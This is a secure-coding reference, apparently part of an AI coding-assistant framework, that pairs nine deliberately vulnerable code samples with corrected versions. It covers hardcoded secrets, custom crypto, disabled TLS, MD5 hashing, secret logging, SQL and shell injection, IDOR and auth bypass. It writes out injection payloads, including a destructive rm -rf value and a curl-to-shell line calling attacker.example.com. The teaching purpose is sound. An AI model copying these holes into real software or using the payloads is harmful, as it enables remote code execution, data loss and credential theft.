# Anti-Patterns + Canonical Patterns — SECURITY-CORE

Full anti-pattern + canonical pattern pairs with code examples. Referenced from `SKILL.md` §6 Anti-Pattern Summaries. Loaded on demand when concrete examples are needed (typically Stage 5 Phase 2 Security Audit or Phase 3 Red Team).

Eight anti-pattern pairs covering the `CLAUDE.md` §5 hard-refusal list (AP-1, AP-2, AP-3, AP-4, AP-5, AP-7) and the most common injection patterns (AP-6, AP-8). Per `DEC-2026-05-17-003` Clause 1: every anti-pattern is paired with a canonical pattern.

---

## AP-1: Hardcoded credentials

**Pattern:**

```typescript
// src/config/api-clients.ts
const STRIPE_SECRET_KEY = "sk_live_51HzABc...4Yx9";
const DATABASE_URL = "postgres://app_user:s3cret!@prod-db.example.com:5432/appdb";

export const stripeClient = new Stripe(STRIPE_SECRET_KEY);
export const db = new Pool({ connectionString: DATABASE_URL });
```

**Violates:** Rule 5.4 (hard-refusal — hardcoded credentials in code or version control). See `rules.md#rule-54-secrets-never-in-code-logs-or-version-control`.

**Why it fails:** Once this file is committed, the Stripe live key and database production password are in git history forever — across every clone of the repo, every fork, every laptop the repo was ever pulled to. Even after the secret is removed in a later commit, the historical commit still contains it; rotation is the only fix. If the repo is ever made public or leaked, both the payment infrastructure AND production database are immediately compromised.

**Source for failure mode:** `OWASP-TOP10 A02:2025 (Security Misconfiguration)` + `OWASP-ASVS 5.0 V11`. Real-world incident class — secrets leaking via GitHub is one of the most common credential-compromise vectors per public breach reports.

### CP-1: Environment variables with explicit validation

**Pattern:**

```typescript
// src/config/api-clients.ts
function requireEnv(name: string): string {
  const value = process.env[name];
  if (!value) {
    throw new Error(`Required environment variable ${name} is not set`);
  }
  return value;
}

const STRIPE_SECRET_KEY = requireEnv("STRIPE_SECRET_KEY");
const DATABASE_URL = requireEnv("DATABASE_URL");

export const stripeClient = new Stripe(STRIPE_SECRET_KEY);
export const db = new Pool({ connectionString: DATABASE_URL });
```

```bash
# .env (gitignored)
STRIPE_SECRET_KEY=sk_test_51HzABc...
DATABASE_URL=postgres://localhost:5432/appdb_dev

# .env.example (committed — documents required variables without values)
STRIPE_SECRET_KEY=
DATABASE_URL=
```

**Pairs with:** Anti-pattern AP-1

**Why it works:** Secrets live in `.env` (gitignored) for development; in the platform's secret store (Vercel/AWS/etc.) for production. `.env.example` documents the variable NAMES so collaborators know what they need without exposing the values. The `requireEnv` helper fails loudly at startup if a required variable is missing — failing fast at startup beats failing mysteriously at the first API call.

**Additional considerations:** For staging/CI, use the platform's encrypted secret storage with appropriate scoping (production keys never reach staging environments). Rotation policy: when a secret is exposed (in a log line, a code paste, a screen share), assume compromise and rotate immediately rather than evaluating "did anyone see it?"

---

## AP-2: Custom cryptography

**Pattern:**

```python
# src/utils/crypto_helpers.py
def encrypt(plaintext: str, key: str) -> str:
    """Custom encryption — XOR with rotating key."""
    encrypted = []
    for i, char in enumerate(plaintext):
        encrypted.append(chr(ord(char) ^ ord(key[i % len(key)])))
    return "".join(encrypted)


def hash_password(password: str) -> str:
    """Custom password hash — deterministic, salt-free."""
    result = 0
    for char in password:
        result = (result * 31 + ord(char)) & 0xFFFFFFFF
    return hex(result)[2:]
```

**Violates:** Rule 5.3 (hard-refusal — custom cryptography). See `rules.md#rule-53-use-established-cryptography-never-roll-your-own`.

**Why it fails:** Both functions look plausible and produce different output for different input — the surface signs of "encryption" and "hashing." Neither provides any actual security:

- The XOR "encryption" is broken in minutes by anyone who knows the algorithm. Known-plaintext attack: if an attacker knows any portion of the original text, they can recover the key. Even without known plaintext, statistical analysis recovers short keys trivially.
- The "hash" has terrible collision properties (decades-old `string.hashCode()`-style polynomial hash), no salt (rainbow tables apply directly), and is far too fast (a modern GPU can compute billions per second, enabling offline brute-force).

The track record of custom crypto is essentially 100% broken when reviewed by actual cryptographers. The reason isn't that the authors are unintelligent; it's that the gap between "feels right" and "withstands modern attacks" is enormous and only fillable by extensive cryptanalysis.

**Source for failure mode:** `OWASP-TOP10 A04:2025 (Cryptographic Failures)` + `OWASP-ASVS 5.0 V11`. Generic class — see also CWE-327 (Use of Broken or Risky Cryptographic Algorithm).

### CP-2: Established library with current algorithms

**Pattern:**

```python
# src/utils/crypto_helpers.py
from argon2 import PasswordHasher
from cryptography.fernet import Fernet

# Password hashing: Argon2id (memory-hard, salt built in)
password_hasher = PasswordHasher()


def hash_password(password: str) -> str:
    """Hash a password with Argon2id. Returns encoded hash including salt + parameters."""
    return password_hasher.hash(password)


def verify_password(password: str, encoded_hash: str) -> bool:
    """Verify a password against its Argon2id hash."""
    try:
        password_hasher.verify(encoded_hash, password)
        return True
    except Exception:
        return False


# Symmetric encryption: Fernet (AES-128-CBC + HMAC-SHA256, authenticated)
# Key is generated once and stored in a secret manager; rotate periodically.
def encrypt(plaintext: str, key: bytes) -> bytes:
    """Encrypt a string with Fernet. Key must come from Fernet.generate_key() or equivalent."""
    return Fernet(key).encrypt(plaintext.encode("utf-8"))


def decrypt(ciphertext: bytes, key: bytes) -> str:
    """Decrypt a Fernet ciphertext. Raises if authentication tag is invalid."""
    return Fernet(key).decrypt(ciphertext).decode("utf-8")
```

**Pairs with:** Anti-pattern AP-2

**Why it works:** `argon2-cffi` provides Argon2id, the current OWASP-recommended password hash. The library handles salt generation, parameter encoding, and verification automatically. `cryptography.fernet` provides authenticated symmetric encryption — encryption AND integrity check; tampering with the ciphertext causes decryption to raise rather than silently produce wrong plaintext. Both libraries are widely deployed, actively maintained, and reviewed by cryptographers.

**Additional considerations:** For asymmetric crypto (signatures, key exchange), prefer Ed25519 / X25519 via `cryptography.hazmat.primitives.asymmetric`. For random generation for security purposes, use `secrets` (Python) — never `random` (the standard PRNG is not cryptographically secure). Future skill `security-cryptography` (Phase 7) covers algorithm selection in depth.

---

## AP-3: Disabled TLS verification

**Pattern:**

```python
# src/clients/upstream_api.py
import requests
import urllib3

# "Temporary" disable for development with self-signed certs — never removed.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def fetch_upstream_data(account_id: str) -> dict:
    response = requests.get(
        f"https://upstream.example.com/accounts/{account_id}",
        headers={"Authorization": f"Bearer {API_TOKEN}"},
        verify=False,
    )
    return response.json()
```

**Violates:** Rule 5.5 (hard-refusal — disabled SSL/TLS verification). See `rules.md#rule-55-tls-verification-always-enabled-strong-defaults`.

**Why it fails:** `verify=False` tells the TLS library "accept any certificate, regardless of who signed it or for what hostname." This means anyone in the network path between this client and `upstream.example.com` (a coffee-shop Wi-Fi attacker, a malicious proxy, a compromised CDN edge, a state-level adversary on the routing path) can present their own certificate, intercept the request, read the bearer token, AND modify the response. The encryption still happens — but to whoever happens to be on the network, not specifically to the intended upstream.

The pattern is especially insidious because the application BEHAVES normally. The data flows; the response looks right. The compromise is invisible to anything except packet capture by someone with read access to the wire. The `urllib3.disable_warnings(...)` line is a sign the author saw the runtime warning and decided to silence it rather than fix the underlying issue.

**Source for failure mode:** `OWASP-TOP10 A02:2025 (Security Misconfiguration)` + `OWASP-ASVS 5.0 V12`. See also CWE-295 (Improper Certificate Validation).

### CP-3: Default verification; explicit CA when needed

**Pattern:**

```python
# src/clients/upstream_api.py
import requests

# Production: default trust store (no overrides)
def fetch_upstream_data(account_id: str) -> dict:
    response = requests.get(
        f"https://upstream.example.com/accounts/{account_id}",
        headers={"Authorization": f"Bearer {API_TOKEN}"},
        # verify=True is the default; certificate is validated against system trust store
    )
    response.raise_for_status()
    return response.json()


# If a private CA is required (rare; internal-only services), point at the CA file:
# requests.get(url, verify="/etc/ssl/certs/internal-ca.pem")
# The CA file is provisioned at deploy time, not embedded in the repo.
```

**Pairs with:** Anti-pattern AP-3

**Why it works:** `requests` defaults to `verify=True` against the system trust store, which has the root CAs the OS ships with. For internal services that legitimately use a private CA, the right answer is to point `verify=` at the specific CA cert file (provisioned at deploy time by the infrastructure layer) rather than disabling verification entirely. The trust decision is then "I trust certificates signed by THIS internal CA" rather than "I trust any certificate."

**Additional considerations:** For mutual TLS (mTLS) where both sides authenticate, pass `cert=("/path/to/client.crt", "/path/to/client.key")`. For certificate pinning when threat model warrants (mobile apps especially), libraries like `pin-tls` exist. Never disable verification for "convenience during development" — set up the internal CA correctly even in dev environments so the production-code-path is exercised.

---

## AP-4: MD5 or SHA-1 for security purposes

**Pattern:**

```python
# src/auth/password_handling.py
import hashlib


def hash_password(password: str) -> str:
    """Hash a password with MD5 for storage."""
    return hashlib.md5(password.encode("utf-8")).hexdigest()


def verify_password(password: str, stored_hash: str) -> bool:
    return hashlib.md5(password.encode("utf-8")).hexdigest() == stored_hash
```

**Violates:** Rule 5.3 (hard-refusal — cryptographically broken algorithms for security purposes). See `rules.md#rule-53-use-established-cryptography-never-roll-your-own`.

**Why it fails:** MD5 is broken for security purposes for two compounding reasons:

1. **Cryptographic weakness.** MD5 has known collision attacks dating back to 2004 (Wang et al., demonstrated practical collisions). For password storage, the relevant attack isn't collision but preimage — and while MD5's preimage resistance hasn't fully fallen, it's weaker than SHA-256 family even before considering speed.

2. **Speed.** MD5 is a fast general-purpose hash designed for performance, not for password storage. A consumer-grade GPU computes billions of MD5 hashes per second. An attacker with the leaked hash file performs an offline brute-force attack against common passwords (and even uncommon ones) in hours to days. The lack of per-password salt — also missing in this pattern — means a single rainbow table cracks every password in the database at once.

SHA-1 has the same speed problem and additional cryptographic weakness (Google's SHAttered 2017 demonstrated practical collisions). Neither belongs anywhere near password storage.

**Source for failure mode:** `OWASP-TOP10 A04:2025 (Cryptographic Failures)` + `OWASP-ASVS 5.0 V11`. See also OWASP Password Storage Cheat Sheet; CWE-327; CWE-916.

### CP-4: Argon2id (or bcrypt/scrypt) with built-in salt

**Pattern:**

```python
# src/auth/password_handling.py
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# Parameters tuned for ~100ms hash on 2026 production hardware.
# Revisit annually as hardware improves.
password_hasher = PasswordHasher(
    time_cost=3,
    memory_cost=65536,  # 64 MB
    parallelism=4,
)


def hash_password(password: str) -> str:
    """Hash a password with Argon2id. Returns encoded hash including salt + parameters."""
    return password_hasher.hash(password)


def verify_password(password: str, encoded_hash: str) -> bool:
    """Verify a password. Returns False on mismatch; raises only on malformed hash."""
    try:
        password_hasher.verify(encoded_hash, password)
        return True
    except VerifyMismatchError:
        return False
```

**Pairs with:** Anti-pattern AP-4

**Why it works:** Argon2id is the current OWASP-recommended password hash (winner of the 2015 Password Hashing Competition). It is:

- **Memory-hard** — requires significant RAM per hash, defeating GPU and ASIC parallelization
- **Salted** — each call generates a unique salt embedded in the output, defeating rainbow tables
- **Tunable** — `time_cost`, `memory_cost`, `parallelism` raised over time as hardware improves
- **Self-describing** — the encoded hash includes the algorithm version and parameters, so verification works correctly even after parameters are increased for new passwords

**Additional considerations:** For systems that cannot use Argon2id (legacy interop), bcrypt with cost ≥12 or scrypt with current parameters are acceptable. NEVER use plain SHA-256 for passwords — even with salt, it's far too fast for password storage.

---

## AP-5: Logging sensitive data

**Pattern:**

```typescript
// src/api/middleware/request-logger.ts
import { logger } from "../logging";

export function requestLogger(req, res, next) {
  logger.info("Incoming request", {
    method: req.method,
    path: req.path,
    headers: req.headers,
    body: req.body,
    query: req.query,
  });
  next();
}
```

**Violates:** Rule 5.7 (hard-refusal — logging full credentials, tokens, or sensitive personal data). See `rules.md#rule-57-log-security-events-never-log-secrets`.

**Why it fails:** `req.headers` includes `Authorization: Bearer <token>` and `Cookie: session=<token>` on authenticated requests — every authenticated request logs the user's credentials. `req.body` on a login request logs the cleartext password; on a registration request logs the password AND PII; on a credit-card update endpoint logs the full card number. Once logged, those values flow into the centralized logging system, monitoring dashboards, log archives, the SOC 2 audit trail — places not designed for secret handling, often with broader access than the application database itself. A breach of the logging system becomes a credentials-breach for every user who logged in during the retention window.

The pattern is especially common in AI-generated code because "log the request for debugging" is a frequent ask, and AI naturally generates the most permissive version unless explicitly told otherwise.

**Source for failure mode:** `OWASP-TOP10 A09:2025 (Security Logging and Alerting Failures)` + `OWASP-ASVS 5.0 V16`. See also CWE-532 (Insertion of Sensitive Information into Log File).

### CP-5: Allow-list logging via explicit field sanitization

**Pattern:**

```typescript
// src/api/middleware/request-logger.ts
import { logger } from "../logging";

const SAFE_HEADERS = new Set([
  "host",
  "user-agent",
  "accept",
  "accept-language",
  "content-type",
  "content-length",
  "referer",
]);

const SENSITIVE_BODY_KEYS = new Set([
  "password",
  "current_password",
  "new_password",
  "token",
  "api_key",
  "credit_card",
  "ssn",
  "secret",
]);

function sanitizeHeaders(headers: Record<string, string>): Record<string, string> {
  const safe: Record<string, string> = {};
  for (const [key, value] of Object.entries(headers)) {
    if (SAFE_HEADERS.has(key.toLowerCase())) {
      safe[key] = value;
    }
  }
  return safe;
}

function sanitizeBody(body: unknown): unknown {
  if (typeof body !== "object" || body === null) return body;
  const safe: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(body as Record<string, unknown>)) {
    safe[key] = SENSITIVE_BODY_KEYS.has(key.toLowerCase()) ? "[REDACTED]" : value;
  }
  return safe;
}

export function requestLogger(req, res, next) {
  logger.info("Incoming request", {
    method: req.method,
    path: req.path,
    headers: sanitizeHeaders(req.headers),
    body: sanitizeBody(req.body),
    user_id: req.user?.id,  // ID instead of full user object
  });
  next();
}
```

**Pairs with:** Anti-pattern AP-5

**Why it works:** Headers are allow-listed — only the explicitly-named-safe ones get logged. Bodies pass through a sanitizer that redacts known-sensitive keys (case-insensitive). User identification is by ID, not full user object. The pattern is "explicitly say what's safe to log" rather than "log everything and hope nothing sensitive slips through" — the second pattern always loses to schema changes and new endpoints adding fields that weren't on anyone's mind when the logger was written.

**Additional considerations:** Production logging stacks (Datadog, Splunk, ELK) often support attribute-level masking at ingestion as a defense-in-depth layer. Use both: sanitize at the application AND configure ingestion-side masking. For high-sensitivity environments, consider a separate audit log for security events (with restricted access) distinct from general application logs.

---

## AP-6: SQL injection via string concatenation

**Pattern:**

```python
# src/repositories/users.py
def find_user_by_email(email: str) -> dict | None:
    query = f"SELECT id, email, name FROM users WHERE email = '{email}' LIMIT 1"
    return db.execute(query).fetchone()


def update_user_name(user_id: str, new_name: str) -> None:
    query = f"UPDATE users SET name = '{new_name}' WHERE id = '{user_id}'"
    db.execute(query)
    db.commit()
```

**Violates:** Rule 5.1 (validate at input) AND Rule 5.6 (output encoding matches context). See `rules.md#rule-56-output-encoding-matches-context`.

**Why it fails:** Any user-controlled value reaching `email`, `new_name`, or `user_id` can break out of the string literal and inject arbitrary SQL. Classic example: `email = "x' OR '1'='1"` makes the WHERE clause always true, returning every user. Worse: `email = "x'; DROP TABLE users; --"` runs the DROP and comments out the rest of the original query.

This is one of the most well-documented vulnerabilities in software history (OWASP Top 10 has had it since 2003), and yet remains common because string concatenation feels natural and the bug is invisible in development unless tested for. AI-generated code commonly slips into this pattern when generating the second or third query in a file — the first might be parameterized, but consistency breaks under prompt fatigue.

**Source for failure mode:** `OWASP-TOP10 A05:2025 (Injection)` + `OWASP-ASVS 5.0 V1` + `OWASP-ASVS 5.0 V2`. See also CWE-89 (Improper Neutralization of Special Elements used in an SQL Command).

### CP-6: Parameterized queries

**Pattern:**

```python
# src/repositories/users.py
def find_user_by_email(email: str) -> dict | None:
    return db.execute(
        "SELECT id, email, name FROM users WHERE email = ? LIMIT 1",
        [email],
    ).fetchone()


def update_user_name(user_id: str, new_name: str) -> None:
    db.execute(
        "UPDATE users SET name = ? WHERE id = ?",
        [new_name, user_id],
    )
    db.commit()
```

**Pairs with:** Anti-pattern AP-6

**Why it works:** The `?` placeholders pass the query structure and the parameter values as separate channels to the database driver. The driver binds the parameters in a way that the database engine treats as data, not syntax — even if `email` contains `'; DROP TABLE users; --`, it's bound as a literal string value compared against the email column, never parsed as SQL.

**Additional considerations:** Different drivers use different placeholder syntax: `?` (SQLite, MySQL via mysql-connector), `$1, $2, ...` (PostgreSQL via psycopg/pg), `%s` (PostgreSQL via older psycopg2 — still parameterized, NOT Python string formatting). Always check the driver's documentation. ORMs (SQLAlchemy, Prisma, Drizzle) parameterize by default for `.where()` / `.filter()` / column-comparison APIs but provide raw-query escape hatches that DO NOT — verify before using raw queries.

---

## AP-7: Authorization by obscurity

**Pattern:**

```typescript
// src/api/handlers/documents.ts
app.get("/api/documents/:documentId", async (req, res) => {
  // "UUIDs are hard to guess, so anyone with the URL is authorized."
  const doc = await db.documents.findById(req.params.documentId);
  if (!doc) {
    return res.status(404).json({ error: "Not found" });
  }
  res.json(doc);
});
```

**Violates:** Rule 5.2 (hard-refusal — bypassing authorization for "convenience" on endpoints handling user data). See `rules.md#rule-52-authorize-every-action-default-deny`.

**Why it fails:** UUID unguessability is not authorization. The UUID can leak through dozens of paths:

- Server logs that record `req.path`
- Browser history shared across users on a shared computer
- Referer headers leaking to third-party analytics or embedded resources
- Email link previews (Slack, Outlook, Apple) pre-fetching content
- Indexed by search engines if the URL is ever crawled
- Shared in support tickets, copy-paste in chat, screenshots
- Returned in any API that lists documents the user owns — but the listing endpoint then doesn't restrict who sees the URLs

Once the UUID is anywhere except the intended user's session, anyone with it has full access. The endpoint has no way to revoke access without invalidating the URL itself (and any legitimate bookmarks). This is also known as Insecure Direct Object Reference (IDOR) when the identifier is an integer; with UUIDs, it's the same class of bug just with slightly higher difficulty for attackers to enumerate.

**Source for failure mode:** `OWASP-TOP10 A01:2025 (Broken Access Control)` (the #1 category in 2025) + `OWASP-ASVS 5.0 V8`. See also CWE-639 (Authorization Bypass Through User-Controlled Key); the OWASP IDOR pattern.

### CP-7: Explicit authorization check at the operation site

**Pattern:**

```typescript
// src/api/handlers/documents.ts
app.get("/api/documents/:documentId", requireAuth, async (req, res) => {
  const doc = await db.documents.findById(req.params.documentId);

  if (!doc) {
    return res.status(404).json({ error: "Not found" });
  }

  // Explicit authorization: the authenticated user must own the document
  // OR be in the document's shared-users list OR have admin role.
  const canRead =
    doc.ownerId === req.user.id ||
    doc.sharedWithUserIds.includes(req.user.id) ||
    req.user.role === "admin";

  if (!canRead) {
    // Return 404 not 403 to avoid revealing that the document exists
    return res.status(404).json({ error: "Not found" });
  }

  res.json(doc);
});
```

**Pairs with:** Anti-pattern AP-7

**Why it works:** Authorization is explicitly checked against the authenticated user's relationship to the document. The check is at the operation site, so any code path reaching this handler runs it. Returning `404` (not `403`) on the failure case avoids leaking existence — an attacker probing UUIDs cannot distinguish "this UUID doesn't exist" from "this UUID exists but you cannot access it."

**Additional considerations:** For systems with many resources and many permission types, consider a centralized authorization library (Casbin, OpenFGA, cedar-policy) that lets policies be defined declaratively and checked uniformly. The principle is the same: the *check happens*, and *defaults to deny*. Future skills `security-iam-authorization` (Phase 6) and `security-iam-authentication` (Phase 6) cover depth.

---

## AP-8: Shell command from user input

**Pattern:**

```python
# src/services/file_converter.py
import subprocess


def convert_to_png(uploaded_filename: str) -> str:
    """Convert an uploaded file to PNG using ImageMagick."""
    output_path = f"/tmp/converted_{uploaded_filename}.png"
    subprocess.run(
        f"convert {uploaded_filename} {output_path}",
        shell=True,
        check=True,
    )
    return output_path
```

**Violates:** Rule 5.1 (validate at input) AND Rule 5.6 (output encoding matches context). See `rules.md#rule-56-output-encoding-matches-context`.

**Why it fails:** `shell=True` runs the command through the shell, which interprets shell metacharacters in `uploaded_filename`. An uploaded filename of `; rm -rf / #` produces the command:

```
convert ; rm -rf / # /tmp/converted_; rm -rf / #.png
```

...which runs `convert` with no args, then `rm -rf /` to attempt root deletion, then comments out the rest. Even less destructive payloads (`foo.png; curl http://attacker.example.com/exfil | sh`) achieve arbitrary code execution as the application user. Application user permissions are usually sufficient to read every secret and database the application has access to.

The pattern is especially insidious in upload-handling code because the "filename" feels like data, not code. The user typed it, sure, but it's just a string — until it's passed to the shell, where it becomes shell syntax.

**Source for failure mode:** `OWASP-TOP10 A05:2025 (Injection)` + `OWASP-ASVS 5.0 V1` + `OWASP-ASVS 5.0 V2`. See also CWE-78 (Improper Neutralization of Special Elements used in an OS Command).

### CP-8: Argument array; no shell interpretation; validated filename

**Pattern:**

```python
# src/services/file_converter.py
import re
import subprocess
import uuid
from pathlib import Path


_SAFE_FILENAME = re.compile(r"^[A-Za-z0-9._-]+$")


def convert_to_png(uploaded_filename: str, upload_dir: Path) -> Path:
    """Convert an uploaded file to PNG. Filename must be alphanumeric/dot/underscore/hyphen only."""
    if not _SAFE_FILENAME.match(uploaded_filename):
        raise ValueError(f"Invalid filename: {uploaded_filename!r}")

    input_path = upload_dir / uploaded_filename
    if not input_path.is_file():
        raise FileNotFoundError(f"Upload not found: {uploaded_filename}")

    # Use a server-generated output path; do not derive it from user input.
    output_path = upload_dir / f"converted_{uuid.uuid4().hex}.png"

    # Argument array: each item is passed as a separate argument; no shell.
    subprocess.run(
        ["convert", str(input_path), str(output_path)],
        check=True,
        shell=False,  # default; explicit for clarity
    )
    return output_path
```

**Pairs with:** Anti-pattern AP-8

**Why it works:** Three defenses stack:

1. **Filename validation** at the boundary — the regex rejects anything containing shell metacharacters before the value flows further into the function. Per Rule 5.1.
2. **Argument array** — `subprocess.run([cmd, arg1, arg2], shell=False)` passes each argument as a separate string directly to the OS `execve` syscall. The shell is not involved; shell metacharacters in arguments are treated as literal characters in those arguments, not parsed as syntax. Per Rule 5.6.
3. **Server-generated output path** — the output filename uses a UUID rather than derivation from the user-supplied filename, avoiding the case where the user's value re-enters another sensitive context (a filesystem path that could be traversed).

**Additional considerations:** Be aware that `subprocess.run([...], shell=False)` is the safe default in Python; in Node.js the equivalent is `child_process.execFile(command, [args])` rather than `child_process.exec(command + " " + args)`. In Go, `exec.Command(name, args...)` is safe; constructing a single string and passing it to `sh -c` is the unsafe equivalent. Same principle across languages: argument arrays, not shell strings.

---

## AP-9: Disabled authentication middleware

**Pattern:**

```typescript
// src/api/middleware/auth.ts
export function requireAuth(req, res, next) {
  // Skip auth in development for faster iteration.
  // TODO: re-enable for production deploy.
  if (process.env.NODE_ENV !== "production") {
    req.user = { id: "dev-user", role: "admin" };
    return next();
  }

  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  // ... real verification ...
}
```

```python
# src/api/decorators.py
def require_auth(handler):
    """Authentication decorator. Disabled in dev for testing."""
    if os.environ.get("SKIP_AUTH") == "1":
        return handler  # Skip authentication entirely
    # ... real implementation ...
```

**Violates:** `CLAUDE.md` §5 hard-refusal list — "Disabled authentication on auth-handling endpoints." Also breaks the precondition for Rule 5.2 (Authorize Every Action, Default Deny) — authorization cannot evaluate without an authenticated principal. See `rules.md#rule-52-authorize-every-action-default-deny`.

**Why it fails:** The disable-toggle pattern relies on `NODE_ENV` or `SKIP_AUTH` being set correctly in every environment, every time, by every operator. The failure modes that ship this to production are well-documented incident classes:

- A new staging environment forgets to set `NODE_ENV=production` → staging exposes admin access without auth.
- A Docker image built with `NODE_ENV=development` baked in is promoted to production unchanged.
- An infrastructure-as-code change accidentally resets the env var.
- A deploy script reads the variable from the wrong source.
- The `TODO: re-enable` comment ages for months; everyone assumes someone else owns the cleanup.

The "fake dev-user as admin" pattern also corrupts every authorization check downstream — every Rule 5.2 evaluation operates on a fabricated principal with admin role, silently passing checks that should fail. Logs show the fake user; alerting cannot distinguish dev-mode-with-fake-user from production-with-fake-user. Detection of the incident depends on noticing the bypass exists, which the comment buried in middleware code does not surface.

**Source for failure mode:** `CLAUDE.md` §5 hard-refusal list. Also `OWASP-TOP10 A07:2025 (Authentication Failures)` + `OWASP-ASVS 5.0 V6 (Authentication)`. See CWE-287 (Improper Authentication) and CWE-306 (Missing Authentication for Critical Function).

### CP-9: Authentication always runs; dev fixtures use real auth paths

**Pattern:**

```typescript
// src/api/middleware/auth.ts
import { verifyJwt } from "../auth/jwt";

export async function requireAuth(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  try {
    req.user = await verifyJwt(token);
    next();
  } catch {
    res.status(401).json({ error: "Unauthorized" });
  }
}
```

```typescript
// In development tests/fixtures: generate a real dev token signed by a dev key.
// The auth path runs identically to production; only the source of the token differs.
// scripts/dev-token.ts
import { signJwt } from "../src/auth/jwt";

const devToken = signJwt(
  { sub: "dev-user-id", role: "developer" },
  process.env.DEV_JWT_SIGNING_KEY!,
);
console.log(devToken);
```

**Pairs with:** Anti-pattern AP-9

**Why it works:** There is no code path that bypasses authentication. Development environments use real tokens, generated by the same signing infrastructure as production (with development-scoped signing keys). The authentication code path is exercised identically in every environment, which means production behavior is also tested behavior. Removing the toggle removes the failure modes where the toggle is misconfigured.

For automated tests, the equivalent is generating a valid token in test setup and including it in the test client's request headers. Test fixtures should not register a "skip auth" middleware; they should use the real auth middleware with valid test tokens.

**Additional considerations:** For local development against a production-like database, use a real OAuth flow with a dev IdP (Auth0 dev tenant, local Keycloak, Supabase Auth with the dev project). The friction of running real auth in dev is small compared to the risk of the bypass surviving to production. Future skill `security-iam-authentication` (Phase 6) covers test-token generation and dev-environment auth patterns in depth.

---

## Pairing discipline

Per `DEC-2026-05-17-003` Clause 1: every anti-pattern is paired with a canonical pattern. The framework's value depends on showing the user both what to reject and what to do instead. Standalone anti-patterns without paired canonical patterns are incomplete and do not ship.

When a new security anti-pattern is observed during use but no clear canonical pattern is obvious, log to `WAIVER-LOG.md` for revisit (or `ERROR-LOG.md` if it represents an active vulnerability) rather than shipping a one-sided entry. The `self-evolution.anti-patterns-observed` frontmatter field accumulates candidates for Phase 11 meta-skill review.
